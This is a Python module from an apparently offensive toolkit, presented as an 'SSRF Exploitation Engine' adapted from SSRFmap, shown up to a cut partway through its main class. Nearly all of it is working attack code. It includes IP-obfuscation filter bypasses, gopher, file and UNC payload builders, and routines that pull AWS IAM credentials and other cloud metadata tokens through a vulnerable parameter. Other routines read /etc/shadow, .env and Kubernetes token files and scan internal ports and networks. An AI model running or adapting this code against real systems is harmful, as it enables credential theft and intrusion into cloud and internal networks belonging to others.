"""
███████╗██████╗ ███████╗
██╔════╝██╔══██╗██╔════╝
███████╗██████╔╝█████╗
╚════██║██╔═══╝ ██╔══╝
███████║██║     ███████╗
╚══════╝╚═╝     ╚══════╝

ZYLON FUSION v3.0 - SSRF Exploitation Engine
Fused from: SSRFmap by swisskyrepo
Capabilities: SSRF Detection, Cloud Metadata, File Read, Port Scan, Network Scan
Termux Compatible | Python 3.13 | No Root Required
"""

import re
import socket
import struct
import hashlib
import ipaddress
from urllib.parse import quote_plus, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Generator

from core.shared_infra import shared_session, oob_provider, regex_cache

try:
    import requests
except ImportError:
    requests = None

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
except ImportError:
    Console = None


# ============================================================================
# IP OBFUSCATION ENGINE (5 Levels - from SSRFmap)
# ============================================================================

class IPObfuscator:
    """5-level IP obfuscation generator for SSRF bypass.
    
    Level 1: Raw IP only
    Level 2: Alternative localhost representations
    Level 3: DNS redirect + CIDR variants
    Level 4: Decimal + enclosed alphanumerics
    Level 5: All techniques combined (dotted hex, octal, overflow)
    """

    LOCALHOST_ALIASES = [
        "127.0.0.1", "0.0.0.0", "localhost", "[::]",
        "0000::1", "0", "127.1", "127.0.1", "::1",
        "0x7f000001", "2130706433",
    ]

    DNS_REDIRECT_DOMAINS = [
        "localtest.me",
        "localtest$google.me",
        "customer1.app.localhost.my.company.127.0.0.1.nip.io",
    ]

    @staticmethod
    def gen_ip_list(ip: str, level: int = 3) -> Generator[str, None, None]:
        """Generate obfuscated IP variants based on bypass level."""
        yield ip  # Level 1: Always yield raw IP

        if level < 2:
            return

        # Level 2: Alternative localhost names (only for 127.0.0.1)
        if ip in ("127.0.0.1", "localhost"):
            for alias in IPObfuscator.LOCALHOST_ALIASES:
                if alias != ip:
                    yield alias
            # CIDR variants
            yield "127.0.0.0"
            yield "127.0.1.3"
            yield "127.42.42.42"
            yield "127.127.127.127"

        if level < 3:
            return

        # Level 3: DNS redirect domains
        for domain in IPObfuscator.DNS_REDIRECT_DOMAINS:
            yield domain

        # xip.io variants for cloud metadata
        if ip == "169.254.169.254":
            yield "169.254.169.254.xip.io"
            yield "metadata.nicob.net"
        elif ip == "metadata.google.internal":
            yield "metadata.google.internal"

        if level < 4:
            return

        # Level 4: Decimal notation + enclosed alphanumerics
        try:
            parts = ip.split(".")
            if len(parts) == 4:
                # Dotless decimal
                decimal = sum(int(p) << (8 * (3 - i)) for i, p in enumerate(parts))
                yield str(decimal)
                # Enclosed alphanumerics (for localhost only)
                if ip == "127.0.0.1":
                    enclosed_map = {
                        'l': '\u24d0', 'o': '\u24de', 'c': '\u24d2',
                        'a': '\u24d1', 't': '\u24e3', 'e': '\u24d4',
                        's': '\u24e2', '.': '.', 'm': '\u24dc',
                    }
                    enclosed = ''.join(enclosed_map.get(c, c) for c in "localtest.me")
                    yield enclosed
        except (ValueError, IndexError):
            pass

        if level < 5:
            return

        # Level 5: Dotted hexadecimal, octal, overflow
        try:
            parts = ip.split(".")
            if len(parts) == 4:
                # Dotted hexadecimal
                hex_parts = [f"0x{int(p):02x}" for p in parts]
                yield ".".join(hex_parts)
                # Dotted octal
                oct_parts = [f"0{int(p):o}" for p in parts]
                yield ".".join(oct_parts)
                # Dotted decimal with overflow (+256 per octet)
                overflow_parts = [str(int(p) + 256) for p in parts]
                yield ".".join(overflow_parts)
        except (ValueError, IndexError):
            pass


# ============================================================================
# PROTOCOL WRAPPERS (from SSRFmap utils.py)
# ============================================================================

class ProtocolWrapper:
    """Construct SSRF payload URIs for various protocols."""

    @staticmethod
    def file_uri(path: str) -> str:
        """file:// URI for local file reading via SSRF."""
        return f"file://{path}"

    @staticmethod
    def gopher(data: str, ip: str, port: int) -> str:
        """gopher:// URI for raw TCP data injection via SSRF.
        
        The gopher protocol sends arbitrary TCP data:
        gopher://IP:PORT/_DATA -> opens TCP, sends URL-decoded DATA
        """
        encoded = quote_plus(data)
        # Un-encode characters that must remain literal for gopher
        encoded = encoded.replace("%2F", "/").replace("%25", "%").replace("%3A", ":")
        return f"gopher://{ip}:{port}/_{encoded}"

    @staticmethod
    def gopher_raw(data: str, ip: str, port: int) -> str:
        """gopher:// with every character %XX encoded (for Tomcat-style payloads)."""
        encoded = "".join(f"%{ord(c):02x}" for c in data)
        return f"gopher://{ip}:{port}/_{encoded}"

    @staticmethod
    def dict_uri(data: str, ip: str, port: int) -> str:
        """dict:// URI for dictionary protocol attacks."""
        return f"dict://{data}:{ip}/{port}"

    @staticmethod
    def http_uri(path: str, ip: str, port: int = 80,
                 username: str = "", password: str = "") -> str:
        """http:// URI for cloud metadata and internal service access."""
        if username and password:
            return f"http://{username}:{password}@{ip}:{port}/{path}"
        return f"http://{ip}:{port}/{path}"

    @staticmethod
    def https_uri(path: str, ip: str, port: int = 443) -> str:
        """https:// URI for encrypted internal service access."""
        return f"https://{ip}:{port}/{path}"

    @staticmethod
    def unc_path(share: str, ip: str) -> str:
        """UNC path for SMB hash capture."""
        return f"\\\\\\\\{ip}\\\\{share}"


# ============================================================================
# DIFFERENTIAL RESPONSE ANALYZER (from SSRFmap)
# ============================================================================

class DiffAnalyzer:
    """Compare SSRF response against baseline to extract injected content."""

    @staticmethod
    def diff_text(ssrf_response: str, baseline_response: str) -> str:
        """Line-by-line diff: returns lines in SSRF response not in baseline."""
        diff_lines = []
        baseline_lines = set(baseline_response.split("\n"))
        for line in ssrf_response.split("\n"):
            if line not in baseline_lines:
                diff_lines.append(line)
        return "\n".join(diff_lines)

    @staticmethod
    def is_significant_diff(ssrf_response: str, baseline_response: str,
                            min_lines: int = 1) -> bool:
        """Check if the diff is significant (more than min_lines different)."""
        diff = DiffAnalyzer.diff_text(ssrf_response, baseline_response)
        return len([l for l in diff.split("\n") if l.strip()]) >= min_lines


# ============================================================================
# CLOUD METADATA ENDPOINTS (from SSRFmap modules)
# ============================================================================

CLOUD_METADATA = {
    "AWS": {
        "ip": "169.254.169.254",
        "port": 80,
        "endpoints": [
            "latest/user-data",
            "latest/meta-data/ami-id",
            "latest/meta-data/reservation-id",
            "latest/meta-data/hostname",
            "latest/meta-data/public-keys/0/openssh-key",
            "latest/meta-data/iam/security-credentials/dummy",
            "latest/meta-data/iam/security-credentials/ecsInstanceRole",
            "latest/meta-data/iam/security-credentials/",
            "latest/meta-data/public-keys/",
            "latest/user-data/",
        ],
        "lambda_endpoint": "localhost:9001/2018-06-01/runtime/invocation/next",
    },
    "GCE": {
        "ip": "metadata.google.internal",
        "port": 80,
        "endpoints": [
            "computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
            "computeMetadata/v1beta1/instance/service-accounts/default/token",
            "computeMetadata/v1beta1/instance/attributes/kube-env?alt=json",
            "computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json",
        ],
        "note": "v1beta1 bypasses Metadata-Flavor header requirement",
    },
    "DigitalOcean": {
        "ip": "169.254.169.254",
        "port": 80,
        "endpoints": [
            "metadata/v1/id",
            "metadata/v1/user-data",
            "metadata/v1/hostname",
            "metadata/v1/region",
            "metadata/v1/public-keys",
            "metadata/v1.json",
        ],
    },
    "Alibaba": {
        "ip": "100.100.100.200",
        "port": 80,
        "endpoints": [
            "latest/meta-data/instance-id",
            "latest/meta-data/image-id",
            "latest/meta-data/",
        ],
    },
    "Azure": {
        "ip": "169.254.169.254",
        "port": 80,
        "endpoints": [
            "metadata/instance?api-version=2021-02-01",
            "metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "note": "Requires Header: Metadata: true",
    },
}

# Common files to read via SSRF file:// protocol
SSRF_READ_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/resolv.conf", "/proc/self/environ", "/proc/self/cmdline",
    "/proc/self/cwd/index.php", "/proc/self/cwd/application.py",
    "/proc/self/cwd/main.py", "/proc/self/cwd/config.py",
    "/proc/self/cwd/.env", "/proc/version", "/proc/meminfo",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
]


# ============================================================================
# SSRF DETECTOR - Automatic SSRF Vulnerability Discovery
# ============================================================================

class SSRFDetector:
    """Automatic SSRF vulnerability detection using differential analysis,
    timing analysis, and out-of-band callback techniques."""

    # SSRF indicator patterns in responses
    SSRF_INDICATORS = [
        # Cloud metadata patterns
        r"ami-id", r"ami-id", r"instance-id", r"reservation-id",
        r"iam/security-credentials", r"public-keys",
        r"computeMetadata", r"metadata\.google\.internal",
        # File read patterns
        r"root:x:0:0", r"/bin/bash", r"/bin/sh",
        r"nobody:x:", r"daemon:x:",
        # Internal network indicators
        r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
        r"172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}",
        r"192\.168\.\d{1,3}\.\d{1,3}",
        # Error-based indicators
        r"Connection refused", r"could not resolve host",
        r"no route to host", r"network is unreachable",
    ]

    def __init__(self, target_url: str, param: str, timeout: int = 10,
                 proxy: str = None, verify_ssl: bool = False):
        self.target_url = target_url
        self.param = param
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl
        self.session = shared_session
        self.baseline_response = None
        self.baseline_text = ""

    def _send_request(self, value: str) -> Optional[requests.Response]:
        """Send request with SSRF payload in the target parameter."""
        try:
            parsed = urlparse(self.target_url)
            if self.param in parsed.query or parsed.query == "":
                # GET parameter injection
                sep = "&" if "?" in self.target_url and parsed.query else "?"
                url = f"{self.target_url}{sep}{self.param}={quote_plus(value)}"
                return self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                # POST parameter injection
                data = {self.param: value}
                return self.session.post(
                    self.target_url, data=data,
                    timeout=self.timeout, allow_redirects=True
                )
        except Exception:
            return None

    def capture_baseline(self):
        """Capture baseline response (empty param value)."""
        resp = self._send_request("")
        if resp:
            self.baseline_response = resp
            self.baseline_text = resp.text
        return resp is not None

    def test_ssrf_basic(self) -> Dict:
        """Test basic SSRF with common internal targets."""
        results = {"vulnerable": False, "findings": [], "details": []}

        if not self.baseline_text and not self.capture_baseline():
            results["details"].append("Failed to capture baseline response")
            return results

        test_payloads = [
            ("localhost", "http://127.0.0.1"),
            ("localhost_alt", "http://0.0.0.0"),
            ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
            ("gce_metadata", "http://metadata.google.internal/computeMetadata/v1beta1/"),
            ("file_etc_passwd", "file:///etc/passwd"),
        ]

        for name, payload in test_payloads:
            resp = self._send_request(payload)
            if not resp:
                continue

            diff = DiffAnalyzer.diff_text(resp.text, self.baseline_text)
            if diff.strip():
                # Check for known SSRF response patterns
                for pattern in self.SSRF_INDICATORS:
                    if regex_cache.search(pattern, diff, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["findings"].append({
                            "test": name,
                            "payload": payload,
                            "evidence": diff[:500],
                            "pattern_matched": pattern,
                        })
                        break
                else:
                    # Diff exists but no known pattern - possible SSRF
                    if len(diff.strip()) > 50:
                        results["details"].append({
                            "test": name,
                            "payload": payload,
                            "diff_length": len(diff),
                            "status": "possible_ssrf",
                        })

        return results

    def test_ssrf_timing(self) -> Dict:
        """Timing-based SSRF detection - measure response time differences
        between valid and invalid internal IPs."""
        import time
        results = {"vulnerable": False, "findings": [], "timing_data": []}

        if not self.baseline_text and not self.capture_baseline():
            return results

        # External IP (should be fast/normal)
        start = time.time()
        self._send_request("http://1.1.1.1")
        external_time = time.time() - start

        # Internal IP targets (may show different timing)
        timing_tests = [
            ("localhost", "http://127.0.0.1"),
            ("aws_meta", "http://169.254.169.254/"),
            ("internal_10", "http://10.0.0.1"),
            ("internal_192", "http://192.168.1.1"),
            ("nonexistent", "http://127.0.0.1:9999/"),
        ]

        for name, payload in timing_tests:
            start = time.time()
            resp = self._send_request(payload)
            elapsed = time.time() - start

            ratio = elapsed / external_time if external_time > 0 else 0
            results["timing_data"].append({
                "test": name, "payload": payload,
                "time": round(elapsed, 3), "ratio": round(ratio, 2),
            })

            # If internal request takes significantly different time
            if ratio > 2.0 or (ratio < 0.3 and elapsed > 0.5):
                results["findings"].append({
                    "test": name, "payload": payload,
                    "time": round(elapsed, 3), "ratio": round(ratio, 2),
                    "indicator": "timing_anomaly",
                })

        if results["findings"]:
            results["vulnerable"] = True

        return results

    def test_ssrf_bypass(self, level: int = 3) -> Dict:
        """Test SSRF with IP obfuscation bypass techniques."""
        results = {"vulnerable": False, "bypasses": [], "tested": 0}

        if not self.baseline_text and not self.capture_baseline():
            return results

        # Test bypass against localhost
        target_ip = "127.0.0.1"
        for ip_variant in IPObfuscator.gen_ip_list(target_ip, level):
            payload = f"http://{ip_variant}"
            resp = self._send_request(payload)
            results["tested"] += 1

            if resp and resp.status_code == 200:
                diff = DiffAnalyzer.diff_text(resp.text, self.baseline_text)
                if diff.strip() and len(diff.strip()) > 20:
                    results["bypasses"].append({
                        "ip_variant": ip_variant,
                        "payload": payload,
                        "diff_length": len(diff),
                        "evidence": diff[:200],
                    })

        if results["bypasses"]:
            results["vulnerable"] = True

        return results


# ============================================================================
# CLOUD METADATA EXTRACTOR (from SSRFmap aws/gce/digitalocean/alibaba modules)
# ============================================================================

class CloudMetadataExtractor:
    """Extract cloud provider metadata via SSRF.
    
    Supports: AWS, GCE, DigitalOcean, Alibaba, Azure
    Uses differential analysis to identify extracted content.
    """

    def __init__(self, target_url: str, param: str, timeout: int = 10,
                 proxy: str = None, bypass_level: int = 3):
        self.target_url = target_url
        self.param = param
        self.timeout = timeout
        self.proxy = proxy
        self.bypass_level = bypass_level
        self.session = shared_session

    def _send_ssrf(self, value: str, extra_headers: Dict = None) -> Optional[str]:
        """Send SSRF request and return response text."""
        try:
            parsed = urlparse(self.target_url)
            headers = extra_headers or {}
            if self.param in parsed.query or parsed.query == "":
                sep = "&" if "?" in self.target_url and parsed.query else "?"
                url = f"{self.target_url}{sep}{self.param}={quote_plus(value)}"
                resp = self.session.get(url, headers=headers,
                                        timeout=self.timeout, allow_redirects=True)
            else:
                data = {self.param: value}
                resp = self.session.post(self.target_url, data=data,
                                         headers=headers, timeout=self.timeout,
                                         allow_redirects=True)
            return resp.text if resp else None
        except Exception:
            return None

    def _get_baseline(self) -> str:
        """Capture baseline response."""
        text = self._send_ssrf("")
        return text or ""

    def extract_cloud_metadata(self, providers: List[str] = None) -> Dict:
        """Extract metadata from specified cloud providers.
        
        Args:
            providers: List of provider names (AWS, GCE, DigitalOcean, Alibaba, Azure)
                      If None, tests all providers.
        """
        results = {"extracted": {}, "errors": []}
        baseline = self._get_baseline()

        target_providers = providers or list(CLOUD_METADATA.keys())

        for provider in target_providers:
            if provider not in CLOUD_METADATA:
                results["errors"].append(f"Unknown provider: {provider}")
                continue

            meta = CLOUD_METADATA[provider]
            ip = meta["ip"]
            port = meta["port"]
            extracted_data = {}

            for ip_variant in IPObfuscator.gen_ip_list(ip, self.bypass_level):
                for endpoint in meta["endpoints"]:
                    payload = ProtocolWrapper.http_uri(endpoint, ip_variant, port)
                    extra_headers = None
                    if provider == "Azure":
                        extra_headers = {"Metadata": "true"}
                    if provider == "GCE":
                        # v1beta1 doesn't need Metadata-Flavor, but add for robustness
                        extra_headers = {"Metadata-Flavor": "Google"}

                    response = self._send_ssrf(payload, extra_headers)
                    if response:
                        diff = DiffAnalyzer.diff_text(response, baseline)
                        if diff.strip() and len(diff.strip()) > 5:
                            # Check for known metadata patterns
                            if not response.startswith("<!DOCTYPE") and not response.startswith("<html"):
                                extracted_data[endpoint] = diff[:1000]

                if extracted_data:
                    break  # Found working IP variant, no need to try more

            if extracted_data:
                results["extracted"][provider] = extracted_data

        return results

    def extract_aws_full(self) -> Dict:
        """Deep AWS metadata extraction with IAM credential harvesting."""
        results = {"metadata": {}, "iam_credentials": None}
        baseline = self._get_baseline()

        # First, discover available IAM roles
        for ip in IPObfuscator.gen_ip_list("169.254.169.254", self.bypass_level):
            payload = ProtocolWrapper.http_uri(
                "latest/meta-data/iam/security-credentials/", ip, 80)
            response = self._send_ssrf(payload)
            if response:
                diff = DiffAnalyzer.diff_text(response, baseline)
                if diff.strip():
                    # Parse role names
                    roles = [r.strip() for r in diff.strip().split("\n") if r.strip()]
                    results["metadata"]["iam_roles"] = roles

                    # Extract credentials for each role
                    for role in roles:
                        role_payload = ProtocolWrapper.http_uri(
                            f"latest/meta-data/iam/security-credentials/{role}",
                            ip, 80)
                        role_response = self._send_ssrf(role_payload)
                        if role_response:
                            role_diff = DiffAnalyzer.diff_text(role_response, baseline)
                            if role_diff.strip():
                                try:
                                    import json
                                    creds = json.loads(role_diff)
                                    results["iam_credentials"] = {
                                        "role": role,
                                        "access_key_id": creds.get("AccessKeyId", ""),
                                        "secret_access_key": creds.get("SecretAccessKey", ""),
                                        "token": creds.get("Token", ""),
                                        "expiration": creds.get("Expiration", ""),
                                    }
                                except (json.JSONDecodeError, ValueError):
                                    results["metadata"][f"iam_{role}"] = role_diff[:500]
                    break  # Found working IP

        return results


# ============================================================================
# SSRF FILE READER (from SSRFmap readfiles module)
# ============================================================================

class SSRFFileReader:
    """Read local files through SSRF using file:// protocol."""

    def __init__(self, target_url: str, param: str, timeout: int = 10,
                 proxy: str = None):
        self.target_url = target_url
        self.param = param
        self.timeout = timeout
        self.proxy = proxy
        self.session = shared_session

    def _send_ssrf(self, value: str) -> Optional[str]:
        """Send SSRF request and return response text."""
        try:
            parsed = urlparse(self.target_url)
            if self.param in parsed.query or parsed.query == "":
                sep = "&" if "?" in self.target_url and parsed.query else "?"
                url = f"{self.target_url}{sep}{self.param}={quote_plus(value)}"
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                data = {self.param: value}
                resp = self.session.post(self.target_url, data=data,
                                         timeout=self.timeout, allow_redirects=True)
            return resp.text if resp else None
        except Exception:
            return None

    def read_files(self, files: List[str] = None) -> Dict:
        """Read files through SSRF file:// protocol.
        
        Args:
            files: List of file paths to read. Uses defaults if None.
        """
        target_files = files or SSRF_READ_FILES
        results = {"read": {}, "errors": []}
        baseline = self._send_ssrf("")

        for filepath in target_files:
            payload = ProtocolWrapper.file_uri(filepath)
            response = self._send_ssrf(payload)

            if response:
                # Check for binary content (ELF detection from SSRFmap)
                if response.startswith("\x7fELF"):
                    results["read"][filepath] = "[BINARY/ELF - content suppressed]"
                    continue

                diff = DiffAnalyzer.diff_text(response, baseline or "")
                if diff.strip() and len(diff.strip()) > 5:
                    # Validate it looks like file content
                    known_patterns = [
                        r"root:", r"nobody:", r"daemon:",  # /etc/passwd
                        r"127\.0\.0\.1", r"localhost",      # /etc/hosts
                        r"PATH=", r"HOME=", r"USER=",       # /proc/self/environ
                        r"Linux version",                    # /proc/version
                        r"MemTotal",                         # /proc/meminfo
                    ]
                    for pattern in known_patterns:
                        if regex_cache.search(pattern, diff):
                            results["read"][filepath] = diff[:2000]
                            break
                    else:
                        # Unknown but significant diff
                        if len(diff.strip()) > 30:
                            results["read"][filepath] = diff[:2000]

        return results


# ============================================================================
# SSRF PORT SCANNER (from SSRFmap portscan module)
# ============================================================================

class SSRFPortScanner:
    """Port scanning through SSRF vulnerability.
    
    Uses concurrent HTTP requests via the SSRF to detect open ports
    on internal services by analyzing response differences.
    """

    # Common internal service ports to scan
    INTERNAL_PORTS = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443,
        445, 993, 995, 1433, 1521, 2375, 2376, 3306, 3389, 5432,
        5900, 6379, 8080, 8443, 8500, 9000, 9090, 9200, 9300,
        11211, 27017, 5000, 5555, 6666, 7777, 8000, 8888,
    ]

    def __init__(self, target_url: str, param: str, target_ip: str = "127.0.0.1",
                 timeout: int = 5, proxy: str = None, max_workers: int = 20):
        self.target_url = target_url
        self.param = param
        self.target_ip = target_ip
        self.timeout = timeout
        self.proxy = proxy
        self.max_workers = max_workers
        self.session = shared_session

    def _scan_port(self, port: int, baseline: str) -> Dict:
        """Scan a single port through SSRF."""
        payload = ProtocolWrapper.http_uri("", self.target_ip, port)
        try:
            parsed = urlparse(self.target_url)
            if self.param in parsed.query or parsed.query == "":
                sep = "&" if "?" in self.target_url and parsed.query else "?"
                url = f"{self.target_url}{sep}{self.param}={quote_plus(payload)}"
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            else:
                data = {self.param: payload}
                resp = self.session.post(self.target_url, data=data,
                                         timeout=self.timeout, allow_redirects=False)

            if not resp:
                return {"port": port, "status": "timeout"}

            # Detection logic from SSRFmap
            if "Connection refused" in resp.text:
                return {"port": port, "status": "closed"}

            if resp.text == baseline:
                return {"port": port, "status": "filtered"}

            # Response differs from baseline - port is open
            diff = DiffAnalyzer.diff_text(resp.text, baseline)
            return {
                "port": port, "status": "open",
                "response_length": len(resp.text),
                "diff_length": len(diff),
                "evidence": diff[:200],
            }
        except requests.exceptions.Timeout:
            return {"port": port, "status": "timeout"}
        except Exception as e:
            return {"port": port, "status": "error", "error": str(e)[:100]}

    def scan_ports(self, ports: List[int] = None, bypass_level: int = 1) -> Dict:
        """Scan ports through SSRF with concurrent requests.
        
        Args:
            ports: List of ports to scan. Uses defaults if None.
            bypass_level: IP obfuscation level (1-5).
        """
        target_ports = ports or self.INTERNAL_PORTS
        results = {"open": [], "closed": [], "filtered": [], "timeout": []}

        # Try IP obfuscation bypasses
        target_ip = self.target_ip
        for ip_variant in IPObfuscator.gen_ip_list(target_ip, bypass_level):
            self.target_ip = ip_variant

            # Capture baseline for this IP variant
            baseline_resp = self._send_baseline()
            baseline = baseline_resp if baseline_resp else ""

            # Concurrent port scan
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {
                    executor.submit(self._scan_port, port, baseline): port
                    for port in target_ports
                }
                for future in as_completed(futures):
                    result = future.result()
                    status = result.get("status", "unknown")
                    if status == "open":
                        results["open"].append(result)
                    elif status == "closed":
                        results["closed"].append(result)
                    elif status == "filtered":
                        results["filtered"].append(result)
                    elif status == "timeout":
                        results["timeout"].append(result)

            if results["open"]:
                break  # Found open ports with this IP variant

        self.target_ip = target_ip  # Restore original
        return results

    def _send_baseline(self) -> Optional[str]:
        """Capture baseline response."""
        try:
            payload = ProtocolWrapper.http_uri("", self.target_ip, 1)
            parsed = urlparse(self.target_url)
            if self.param in parsed.query or parsed.query == "":
                sep = "&" if "?" in self.target_url and parsed.query else "?"
                url = f"{self.target_url}{sep}{self.param}={quote_plus(payload)}"
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                data = {self.param: payload}
                resp = self.session.post(self.target_url, data=data,
                                         timeout=self.timeout, allow_redirects=True)
            return resp.text if resp else None
        except Exception:
            return None


# ============================================================================
# SSRF NETWORK SCANNER (from SSRFmap networkscan module)
# ============================================================================

class SSRFNetworkScanner:
    """Network ping sweep through SSRF vulnerability.
    
    Scans CIDR ranges to discover alive hosts on internal networks.
    """

    DEFAULT_RANGES = ["192.168.1.0/24", "192.168.0.0/24", "10.0.0.0/24"]

    def __init__(self, target_url: str, param: str, timeout: int = 5,
                 proxy: str = None, max_workers: int = 20):
        self.target_url = target_url
        self.param = param
        self.timeout = timeout
        self.proxy = proxy
        self.max_workers = max_workers
        self.session = shared_session

    def _expand_cidr(self, cidr: str) -> List[str]:
        """Expand CIDR notation to list of IPs."""
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            return [str(ip) for ip in network.hosts()]
        except ValueError:
            return []

    def _check_host(self, ip: str, baseline: str) -> Dict:
        """Check if a host is alive through SSRF."""
        payload = ProtocolWrapper.http_uri("", ip, 80)
        try:
            parsed = urlparse(self.target_url)
            if self.param in parsed.query or parsed.query == "":
                sep = "&" if "?" in self.target_url and parsed.query else "?"
                url = f"{self.target_url}{sep}{self.param}={quote_plus(payload)}"
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                data = {self.param: payload}
                resp = self.session.post(self.target_url, data=data,
                                         timeout=self.timeout, allow_redirects=True)

            if not resp:
                return {"ip": ip, "alive": False}

            if "Connection refused" not in resp.text and resp.text != baseline:
                diff = DiffAnalyzer.diff_text(resp.text, baseline)
                return {"ip": ip, "alive": True, "evidence": diff[:200]}
            return {"ip": ip, "alive": False}
        except Exception:
            return {"ip": ip, "alive": False}

    def scan_network(self, cidr_ranges: List[str] = None) -> Dict:
        """Scan network ranges through SSRF to discover alive hosts."""
        ranges = cidr_ranges or self.DEFAULT_RANGES
        results = {"alive_hosts": [], "total_scanned": 0}

        for cidr in ranges:
            ips = self._expand_cidr(cidr)
            if not ips:
                continue

            # Get baseline
            baseline_resp = self._check_host("0.0.0.0", "")
            baseline = baseline_resp.get("evidence", "")

            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {executor.submit(self._check_host, ip, baseline): ip for ip in ips}
                for future in as_completed(futures):
                    results["total_scanned"] += 1
                    result = future.result()
                    if result.get("alive"):
                        results["alive_hosts"].append(result)

        return results


# ============================================================================
# SSRF ENGINE - Main Integration Class for ZYLON
# ============================================================================

class SSRFEngine:
    """ZYLON SSRF Exploitation Engine.
    
    Fused from SSRFmap with enhanced capabilities:
    - Automatic SSRF detection (basic + timing + bypass)
    - Cloud metadata extraction (AWS/GCE/DigitalOcean/Alibaba/Azure)
    - File reading via file:// protocol
    - Port scanning through SSRF
    - Network discovery through SSRF
    - IP obfuscation bypass (5 levels)
    - Differential response analysis
    """

    def __init__(self, console=None):
        self.console = console or Console() if Console else None

    def _print(self, msg: str, style: str = ""):
        """Print message to console."""
        if self.console:
            self.console.print(msg, style=style)
        else:
            print(msg)

    def scan_ssrf_detect(self, target_url: str, param: str,
                         timeout: int = 10, proxy: str = None) -> Dict:
        """Scan 64: Full SSRF vulnerability detection.
        
        Tests for SSRF using three methods:
        1. Basic payload testing with differential analysis
        2. Timing-based detection
        3. IP obfuscation bypass testing
        """
        self._print("\n[SSRF] Starting SSRF Detection Scan", "bold cyan")
        self._print(f"[SSRF] Target: {target_url} | Param: {param}", "dim")

        results = {
            "target": target_url, "param": param,
            "basic": {}, "timing": {}, "bypass": {},
            "vulnerable": False, "severity": "info",
        }

        # Basic SSRF test
        detector = SSRFDetector(target_url, param, timeout, proxy)
        detector.capture_baseline()
        results["basic"] = detector.test_ssrf_basic()

        # Timing test
        results["timing"] = detector.test_ssrf_timing()

        # Bypass test
        results["bypass"] = detector.test_ssrf_bypass(level=3)

        # Determine overall vulnerability
        if results["basic"].get("vulnerable") or results["timing"].get("vulnerable"):
            results["vulnerable"] = True
            results["severity"] = "high"
        elif results["bypass"].get("vulnerable"):
            results["vulnerable"] = True
            results["severity"] = "medium"

        # Display results
        if results["vulnerable"]:
            self._print("\n[SSRF] VULNERABILITY DETECTED!", "bold red")
            if results["basic"].get("findings"):
                self._print(f"  [+] Basic SSRF: {len(results['basic']['findings'])} findings", "red")
            if results["timing"].get("findings"):
                self._print(f"  [+] Timing anomalies: {len(results['timing']['findings'])}", "yellow")
            if results["bypass"].get("bypasses"):
                self._print(f"  [+] Bypass techniques: {len(results['bypass']['bypasses'])} working", "yellow")
        else:
            self._print("\n[SSRF] No SSRF vulnerability detected", "green")

        return results

    def scan_cloud_metadata(self, target_url: str, param: str,
                            providers: List[str] = None, timeout: int = 10,
                            proxy: str = None, bypass_level: int = 3) -> Dict:
        """Scan 65: Cloud metadata extraction via SSRF.
        
        Extracts cloud provider metadata from AWS, GCE, DigitalOcean,
        Alibaba, and Azure through SSRF vulnerability.
        """
        self._print("\n[SSRF] Starting Cloud Metadata Extraction", "bold cyan")
        self._print(f"[SSRF] Target: {target_url} | Bypass Level: {bypass_level}", "dim")

        results = {
            "target": target_url, "param": param,
            "providers_tested": providers or list(CLOUD_METADATA.keys()),
            "extracted": {}, "vulnerable": False,
        }

        extractor = CloudMetadataExtractor(
            target_url, param, timeout, proxy, bypass_level)
        results["extracted"] = extractor.extract_cloud_metadata(providers)

        if results["extracted"].get("extracted"):
            results["vulnerable"] = True
            self._print("\n[SSRF] CLOUD METADATA EXTRACTED!", "bold red")
            for provider, data in results["extracted"]["extracted"].items():
                self._print(f"  [+] {provider}: {len(data)} endpoints leaked", "red")
                for endpoint, content in data.items():
                    self._print(f"      {endpoint}: {content[:80]}...", "dim")
        else:
            self._print("\n[SSRF] No cloud metadata extracted", "green")

        return results

    def scan_ssrf_fileread(self, target_url: str, param: str,
                           files: List[str] = None, timeout: int = 10,
                           proxy: str = None) -> Dict:
        """Scan 66: File reading through SSRF.
        
        Reads local files via file:// protocol through SSRF vulnerability.
        """
        self._print("\n[SSRF] Starting SSRF File Read", "bold cyan")
        self._print(f"[SSRF] Target: {target_url} | Files: {len(files or SSRF_READ_FILES)}", "dim")

        results = {
            "target": target_url, "param": param,
            "files_read": {}, "vulnerable": False,
        }

        reader = SSRFFileReader(target_url, param, timeout, proxy)
        results["files_read"] = reader.read_files(files)

        if results["files_read"]:
            results["vulnerable"] = True
            self._print("\n[SSRF] FILES READ VIA SSRF!", "bold red")
            for filepath, content in results["files_read"].items():
                self._print(f"  [+] {filepath}", "red")
                self._print(f"      {content[:100]}...", "dim")
        else:
            self._print("\n[SSRF] No files readable via SSRF", "green")

        return results

    def scan_ssrf_portscan(self, target_url: str, param: str,
                           target_ip: str = "127.0.0.1",
                           ports: List[int] = None, timeout: int = 5,
                           proxy: str = None, bypass_level: int = 1) -> Dict:
        """Scan 67: Port scanning through SSRF.
        
        Scans internal network ports via SSRF vulnerability.
        """
        self._print("\n[SSRF] Starting SSRF Port Scan", "bold cyan")
        self._print(f"[SSRF] Target: {target_url} | Internal IP: {target_ip}", "dim")

        results = {
            "target": target_url, "param": param,
            "internal_target": target_ip,
            "open_ports": [], "vulnerable": False,
